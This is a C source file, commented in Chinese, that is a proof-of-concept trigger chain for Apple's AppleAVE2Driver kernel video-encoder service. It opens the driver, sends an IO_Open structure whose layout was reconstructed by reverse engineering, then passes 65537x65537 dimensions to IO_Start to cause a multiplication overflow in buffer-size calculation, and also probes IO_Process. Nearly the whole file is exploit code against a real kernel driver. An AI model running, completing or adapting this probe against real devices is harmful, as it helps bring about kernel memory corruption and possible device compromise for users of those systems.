// ave_probe7.c — 完整触发链: IO_Open(构造完整结构) → IO_Start(超大尺寸触发 mul 溢出)
// 基于 A11 逆向: AVE_Open_UserKernel_In_Info 结构布局已从 Open inner 0x39ebb8 还原
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <mach/mach.h>

typedef unsigned int io_service_t;
typedef unsigned int io_connect_t;
typedef int kern_return_t;

extern kern_return_t IOServiceGetMatchingServices(mach_port_t, void*, unsigned int*);
extern void* IOServiceMatching(const char*);
extern kern_return_t IOIteratorNext(unsigned int);
extern kern_return_t IOServiceOpen(io_service_t, mach_port_t, unsigned int, io_connect_t*);
extern kern_return_t IOServiceClose(io_connect_t);
extern kern_return_t IOObjectRelease(unsigned int);
extern kern_return_t IOConnectCallStructMethod(io_connect_t, unsigned int, const void*, size_t, void*, size_t*);

int main(void) {
    unsigned int iter = 0;
    kern_return_t kr = IOServiceGetMatchingServices(0, IOServiceMatching("AppleAVE2Driver"), &iter);
    if (kr || !iter) { printf("no service kr=%d\n", kr); return 1; }
    io_service_t svc = IOIteratorNext(iter);
    io_connect_t conn = 0;
    kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    printf("open kr=0x%x conn=%u\n", kr, conn);
    if (kr || !conn) return 1;

    // ========== IO_Open: AVE_Open_UserKernel_In_Info (1232B) ==========
    // 布局 (从 0x39ebb8 / 0x3abc94 / 0x3d36fc 逆向):
    // +0x10: codecType (0=AVC)  +0x14: 未知
    // +0x18: AVE_GlobalConfig (0x3abc94 解析: +0x0 byte, +0x8 str, +0x24 u32, +0x28 u32,
    //        +0x2c 0x24B 数组, +0x100 u32, +0x104 u32)
    // +0x150: 其他 (0x3d36fc 用)
    unsigned char *open_in = calloc(1, 1232);
    unsigned char *open_out = calloc(1, 8);
    *(unsigned int*)(open_in + 0x10) = 0;   // codecType = AVC
    *(unsigned int*)(open_in + 0x14) = 0;
    // 全局配置: 保持全 0 (0x3abc94 处理 0 值跳过了大部分)
    size_t outsz = 8;
    kr = IOConnectCallStructMethod(conn, 0, open_in, 1232, open_out, &outsz);
    printf("IO_Open: kr=0x%x out0=0x%x\n", kr, *(unsigned int*)open_out);
    free(open_in); free(open_out);
    if (kr) return 1; // Open 失败则后续无意义

    // ========== IO_Start: 超大 width/height 触发 CalcBufSize mul 溢出 ==========
    // IO_Start dispatch: structIn=236656, structOut=4
    // AVE_SessionSettings_UserKernel_In_Info (0x39C70 = 236656B)
    unsigned char *start_in = calloc(1, 236656);
    unsigned char *start_out = calloc(1, 4);
    // 尺寸字段候选位置 (从 CalcSurfaceInfo 0x3cb968 的字段读取推断):
    // 0x3cba04: ldr w8, [x26, #0xd4] → width?  height?
    // 0x3cba0c: ldr w27, [x23, #0x88]
    // 同时把 65537 放到多个常见偏移
    *(unsigned int*)(start_in + 0x10) = 65537;  // width
    *(unsigned int*)(start_in + 0x14) = 65537;  // height
    *(unsigned int*)(start_in + 0x18) = 65537;
    *(unsigned int*)(start_in + 0x1c) = 65537;
    *(unsigned int*)(start_in + 0x94) = 65537;  // IO_Start 传给 AVE_Client_Start 的 idx?
    outsz = 4;
    kr = IOConnectCallStructMethod(conn, 4, start_in, 236656, start_out, &outsz);
    printf("IO_Start(65537x65537): kr=0x%x\n", kr);
    free(start_in); free(start_out);

    // ========== 尝试 IO_Process (32B) ==========
    unsigned char proc_in[32]; memset(proc_in, 0, 32);
    unsigned char proc_out[4]; memset(proc_out, 0, 4);
    *(unsigned int*)(proc_in + 0x10) = 65537;
    *(unsigned int*)(proc_in + 0x14) = 65537;
    outsz = 4;
    kr = IOConnectCallStructMethod(conn, 7, proc_in, 32, proc_out, &outsz);
    printf("IO_Process: kr=0x%x\n", kr);

    IOServiceClose(conn);
    printf("=== done ===\n");
    return 0;
}
